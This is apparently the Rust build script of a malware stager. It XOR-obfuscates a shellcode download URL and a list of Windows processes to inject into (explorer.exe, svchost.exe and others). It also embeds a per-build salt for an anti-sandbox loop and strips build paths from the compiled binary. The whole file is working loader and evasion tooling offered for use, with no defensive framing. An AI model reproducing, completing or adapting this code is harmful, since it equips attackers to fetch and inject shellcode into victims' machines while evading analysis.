use std::collections::hash_map::DefaultHasher;
use std::hash::{Hash, Hasher};
use std::path::Path;
use std::time::SystemTime;
use std::{env, fs};

fn entropy() -> u64 {
    let mut h = DefaultHasher::new();
    SystemTime::now()
        .duration_since(SystemTime::UNIX_EPOCH)
        .map(|d| d.as_nanos())
        .unwrap_or(0xdead_beef)
        .hash(&mut h);
    std::process::id().hash(&mut h);
    h.finish()
}

fn main() {
    // Two independent-looking values from one seed via a mixing step.
    let r1 = entropy();
    let r2 = r1
        .rotate_left(17)
        .wrapping_mul(0x9e37_79b9_7f4a_7c15)
        .wrapping_add(0x6c62_272e_07bb_0142);

    // XOR key: never 0 (XOR with 0 = identity) and never 0xFF.
    let key: u8 = ((r1 & 0xFE) as u8).max(1);

    // Per-build salt baked into the binary -> unique anti-sandbox loop per build.
    let salt: u64 = r2;

    // A third mixing step gives an independent key for process names.
    let r3 = r2
        .rotate_left(31)
        .wrapping_mul(0x517c_c1b7_2722_0a95)
        .wrapping_add(0x3141_5926_5358_9793);
    let proc_key: u8 = ((r3 & 0xFE) as u8).max(1);

    let target = env::var("RG_TARGET")
        .unwrap_or_else(|_| "http://127.0.0.1:80/shellcode.bin".to_string());

    let enc_bytes: Vec<String> = target
        .bytes()
        .map(|b| format!("0x{:02x}u8", b ^ key))
        .collect();

    // Injection process names: a custom single name, or the default fallback chain.
    // The names are NUL-separated so the stager can iterate without std.
    let inject_proc = env::var("INJECT_PROC").unwrap_or_default();
    let inject_proc = inject_proc.trim().to_string();
    let (proc_chain, proc_custom) = if inject_proc.is_empty() {
        // Default fallback chain.
        (
            "explorer.exe\0RuntimeBroker.exe\0sihost.exe\0svchost.exe\0".to_string(),
            false,
        )
    } else {
        // Single custom name from --pid; append a NUL terminator.
        let mut s = inject_proc.clone();
        s.push('\0');
        (s, true)
    };
    let proc_enc_bytes: Vec<String> = proc_chain
        .bytes()
        // Strip the final NUL from the slice — the stager appends one at runtime.
        .take(proc_chain.len() - 1)
        .map(|b| format!("0x{:02x}u8", b ^ proc_key))
        .collect();

    let out_dir = env::var("OUT_DIR").unwrap();
    let dest = Path::new(&out_dir).join("stager_consts.rs");
    fs::write(
        &dest,
        format!(
            "#[allow(dead_code)] const SALT: u64 = {salt}u64;\n\
             #[allow(dead_code)] const SC_KEY: u8 = {key}u8;\n\
             #[allow(dead_code)] const SC_ENC: &[u8] = &[{}];\n\
             #[allow(dead_code)] const PROC_KEY: u8 = {proc_key}u8;\n\
             #[allow(dead_code)] const PROC_CUSTOM: bool = {proc_custom};\n\
             #[allow(dead_code)] const PROC_ENC: &[u8] = &[{}];\n",
            enc_bytes.join(", "),
            proc_enc_bytes.join(", "),
        ),
    )
    .unwrap();

    // Strip build paths from panic messages.
    let manifest_dir = env::var("CARGO_MANIFEST_DIR").unwrap_or_default();
    if !manifest_dir.contains(' ') {
        println!(
            "cargo:rustc-flags=--remap-path-prefix={}=stager",
            manifest_dir
        );
    }

    println!("cargo:rerun-if-env-changed=RG_TARGET");
    println!("cargo:rerun-if-env-changed=INJECT_PROC");
    println!("cargo:rerun-if-env-changed=BUILD_RANDOMIZE");
}
